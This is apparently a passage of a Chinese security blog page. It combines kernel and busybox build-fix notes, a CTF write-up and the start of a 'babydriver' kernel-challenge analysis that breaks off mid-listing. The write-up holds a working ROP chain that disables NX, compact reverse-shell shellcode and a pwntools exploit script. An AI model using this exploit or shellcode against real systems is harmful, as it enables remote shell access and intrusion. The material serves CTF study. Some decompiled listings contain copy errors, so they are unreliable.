<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[plain] view plain copy</span><br><span class="line">$    cd ..  </span><br><span class="line">#    使用静态编译链接．  </span><br><span class="line">$    gcc -static -o helloworld hello.c  </span><br><span class="line">#    将helloworld制作成cpio  </span><br><span class="line">$    echo helloworld | cpio -o --format=newc &gt; rootfs  </span><br><span class="line">1776 blocks  </span><br><span class="line">$    ls -la rootfs   </span><br><span class="line">-rw-rw-r-- 1 seijia seijia 909312 12月 21 13:15 rootfs  </span><br><span class="line">#　使用qemu进行启动  </span><br><span class="line">$    qemu-system-x86_64   \  </span><br><span class="line">     -kernel ./bzImage \  </span><br><span class="line">     -initrd ./rootfs  \  </span><br><span class="line">     -append &quot;root=/dev/ram rdinit=/helloworld&quot;</span><br></pre></td></tr></table></figure>
<pre><code>qemu的-kernel 和-initrd能够绕过bootload直接
对指定的kernel和ramdisk进行加载．
用-append进行额外的选项配置，
在这里我们把根目录直接设置成内存，
启动的init程序设置成放进去的helloworld．
用来检测是否编译成功能输出helloworld
</code></pre><h1 id="内核编译遇到的问题"><a href="#内核编译遇到的问题" class="headerlink" title="内核编译遇到的问题"></a>内核编译遇到的问题</h1><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/kernel/ptrace.c:1472:17: error: conflicting types for ‘syscall_trace_enter’</span><br><span class="line"> asmregparm long syscall_trace_enter(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:145:13: note: previous declaration of ‘syscall_trace_enter’ was here</span><br><span class="line"> extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">arch/x86/kernel/ptrace.c:1517:17: error: conflicting types for ‘syscall_trace_leave’</span><br><span class="line"> asmregparm void syscall_trace_leave(struct pt_regs *regs)</span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/vm86.h:130:0,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/processor.h:10,</span><br><span class="line">                 from /home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:22,</span><br><span class="line">                 from include/linux/thread_info.h:56,</span><br><span class="line">                 from include/linux/preempt.h:9,</span><br><span class="line">                 from include/linux/spinlock.h:50,</span><br><span class="line">                 from include/linux/seqlock.h:29,</span><br><span class="line">                 from include/linux/time.h:8,</span><br><span class="line">                 from include/linux/timex.h:56,</span><br><span class="line">                 from include/linux/sched.h:56,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:11:</span><br><span class="line">/home/muhe/linux_kernel/linux-2.6.32.1/arch/x86/include/asm/ptrace.h:146:13: note: previous declaration of ‘syscall_trace_leave’ was here</span><br><span class="line"> extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">             ^</span><br><span class="line">make[2]: *** [arch/x86/kernel/ptrace.o] 错误 1</span><br><span class="line">make[1]: *** [arch/x86/kernel] 错误 2</span><br><span class="line">make: *** [arch/x86] 错误 2</span><br></pre></td></tr></table></figure>
<p>解决方案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--- linux-2.6.32.59/arch/x86/include/asm/ptrace.h</span><br><span class="line">+++ fix_ptrace.o_compile_error/arch/x86/include/asm/ptrace.h</span><br><span class="line">@@ -130,6 +130,7 @@ </span><br><span class="line"> #ifdef __KERNEL__</span><br><span class="line"> </span><br><span class="line"> #include &lt;linux/init.h&gt;</span><br><span class="line">+#include &lt;linux/linkage.h&gt;</span><br><span class="line"> </span><br><span class="line"> struct cpuinfo_x86;</span><br><span class="line"> struct task_struct;</span><br><span class="line">@@ -142,8 +143,8 @@ </span><br><span class="line">       int error_code, int si_code);</span><br><span class="line"> void signal_fault(struct pt_regs *regs, void __user *frame, char *where);</span><br><span class="line"> </span><br><span class="line">-extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">-extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">+extern asmregparm long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">+extern asmregparm void syscall_trace_leave(struct pt_regs *);</span><br><span class="line"> </span><br><span class="line"> static inline unsigned long regs_return_value(struct pt_regs *regs)</span><br><span class="line"> &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="3-3-问题3"><a href="#3-3-问题3" class="headerlink" title="3.3 问题3"></a>3.3 问题3</h2><p>问题描述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc: error: elf_i386: 没有那个文件或目录</span><br><span class="line">gcc: error: unrecognized command line option ‘-m’</span><br></pre></td></tr></table></figure>
<p>解决方案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch/x86/vdso/Makefile</span><br><span class="line">VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so.1    -Wl,-z,max-page-size=4096 -Wl,-z,common-page-size=4096 把&quot;-m elf_x86_64&quot; 替换为 &quot;-m64&quot;</span><br><span class="line">VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so.1中的 &quot;-m elf_i386&quot; 替换为 &quot;-m32&quot;</span><br></pre></td></tr></table></figure>
<h2 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h2><p>问题描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drivers/net/igbvf/igbvf.h15: error: duplicate member ‘page’</span><br><span class="line">struct page page;</span><br><span class="line">^</span><br><span class="line">make[3]: ** [drivers/net/igbvf/ethtool.o] 错误 1</span><br><span class="line">make[2]: [drivers/net/igbvf] 错误 2</span><br><span class="line">make[1]: [drivers/net] 错误 2</span><br><span class="line">make: * [drivers] 错误 2</span><br></pre></td></tr></table></figure></p>
<p>解决方案<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改名字重复</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *_<span class="title">page</span>;</span></span><br><span class="line">                    u64 page_dma;</span><br><span class="line">                    <span class="keyword">unsigned</span> <span class="keyword">int</span> page_offset;</span><br><span class="line">            &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="busybox编译问题"><a href="#busybox编译问题" class="headerlink" title="busybox编译问题"></a>busybox编译问题</h2><h3 id="2-1-问题一以及解决方案"><a href="#2-1-问题一以及解决方案" class="headerlink" title="2.1 问题一以及解决方案"></a>2.1 问题一以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  loginutils/passwd.c:188:12: error: ‘RLIMIT_FSIZE’ undeclared (first use in this function)</span><br><span class="line">setrlimit(RLIMIT_FSIZE, &amp;rlimit_fsize);</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$  vim include/libbb.h</span><br><span class="line">$  add a line #include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/resource.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="问题二以及解决方案"><a href="#问题二以及解决方案" class="headerlink" title="问题二以及解决方案"></a>问题二以及解决方案</h3><p>错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/ext2_fs.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure></p>
<p>解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux System Utilities ---&gt;</span><br><span class="line">    [ ] mkfs_ext2 </span><br><span class="line">    [ ] mkfs_vfat</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.128Z"><a href="/2018/10/21/关闭nx与反弹shell/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
在本題中明顯提供解題者一個stack buffer overflow的漏洞，
但因為程式有NX保護，必須使用ROP來控制程式行為。
在寫入的第12byte後開始覆蓋main的return address，
共計有88 bytes的overflow空間。
在程式read完以後便切斷該程式對client的連線，
即使拿到shell也無法操控該shell。
</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
但如果全部只使用ROP最多只能放入22個gadgets
（包括argument與padding等等）。
所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
接著便可以shellcode來產生一個reverse shell。
</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
將__libc_stack_end的address放入eax中。
调用_dl_make_stack_executable。
解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。

放入reverse shell的shellcode
建立reverse shell須執行socket、dup2、connect、execve等指令，
由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：

想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
若能應用當時程式的某些state便可減少一點size。
由於fd中0、1、2皆已被close，
拿到的socket fd即已為0，因此只需進行一次dup2。
由於ebp可控（ebp的值會等於input中的第8~11 byte），
由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
push port時使用ax中已有的數值（0x66），
port（big endian）將被固定為0x6600（26112）。
</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.126Z"><a href="/2018/10/21/两道内核/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/两道内核/">两道内核</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="用户态和内核态切换"><a href="#用户态和内核态切换" class="headerlink" title="用户态和内核态切换"></a>用户态和内核态切换</h1><h2 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h2><pre><code>i.    通过swapgs切换GS段寄存器，
是将GS寄存器值和一个特定位置的值进行交换，
目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。

ii.    将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，
将CPU独占区域里记录的内核栈顶放入rsp(esp)。

iii.    通过push保存各寄存器值

iv.    通过汇编指令判断是否是x32_abi（暂时可以忽略这个内容）。

v.    通过系统调用号，跳到全局变量sys_call_table相应位置继续执行相应系统调用。
</code></pre><h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2><pre><code>i.    通过swapgs恢复GS值。

ii.    通过sysretq或者iretq恢复到用户空间进行执行，
如果使用Iretq还需要给出用户空间的一些信息，比如CS值，
eflags标志寄存器值，用户栈顶位置等等信息。
</code></pre><h1 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1.    题目分析"></a>1.    题目分析</h1><p>题目给出了3个文件，一个rootfs.cpio一个bzImage和一个boot.sh，boot.sh内容如下：</p>
<p>1.#!/bin/bash<br>2.<br>3.qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append ‘console=ttyS0 root=/dev/ram oops=panic panic=1’ -enable-kvm -monitor /dev/null -m 64M –nographic -smp cores=1,threads=1 -cpu kvm64,+smep</p>
<pre><code>很显然我们需要安装qemu，这个就自己去安装啦。
然后就是一个对qemu的调用，kernel使用了bzImage，
然后用rootfs.cpio作为initrd，
其实就是bzImage是内核的映像，然后rootfs.cpio是根文件的映像。
在远程，也就是使用这个boot.sh打开的qemu环境，
我们能接触到的就是在这个qemu环境里。
qemu环境里有flag，可是我们没有权限读取，
必须是root才有权限读取，显然我们需要进行提权。
通过查看/lib/modules/目录，我们发现有一个babydriver.ko，
通过查看/proc/modules我们可以看到babydriver.ko作为内核模块已经加载进
了内核里，我们还可以看到其加载的地址，很好！
接下来的任务就很显然了，我们需要看懂babydriver.ko干了什么。
init和exit函数没有什么太大的意思，基本上就是设置参数，
初始化设备等等工作，我们的重点是几个函数。不过需要注意，init中设置了/dev/babydev作为设备文件。
</code></pre><p>open函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  __int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp,__int64 a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>  <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span>  _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span>  LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span>  babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span> printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br><span class="line">close函数：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>__int64 __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp, __int64a3, __int64 a4)</span></span></span><br><span class="line">2.  &#123;</span><br><span class="line"><span class="number">3.</span>   <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line"><span class="number">4.</span>  __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">5.</span> </span><br><span class="line"><span class="number">6.</span> _fentry__(inode, filp, a3, a4);</span><br><span class="line"><span class="number">7.</span> LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line"><span class="number">8.</span> babydev_struct.device_buf = v4;</span><br><span class="line"><span class="number">9.</span>  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line"><span class="number">10.</span>  printk(<span class="string">"device openn"</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line"><span class="number">11.</span> <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line"><span class="number">12.</span>&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> __int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, __int64 command, <span class="keyword">unsigned</span> __int64 arg, __int64 a4)</span></span></span><br><span class="line">2. &#123;</span><br><span class="line"><span class="number">3.</span> <span class="keyword">size_t</span> v4; <span class="comment">// rdx@1</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">size_t</span> v5; <span class="comment">// rbx@1</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">char</span> *v6; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">6.</span> __int64 v7; <span class="comment">// rdx@2</span></span><br><span class="line"><span class="number">7.</span> __int64 result; <span class="comment">// rax@2</span></span><br><span class="line"><span class="number">8.</span> </span><br><span class="line"><span class="number">9.</span> _fentry__(filp, command, arg, a4);</span><br><span class="line"><span class="number">10.</span> v5 = v4;silu</span><br><span class="line"><span class="number">11.</span> <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x10001</span> )</span><br><span 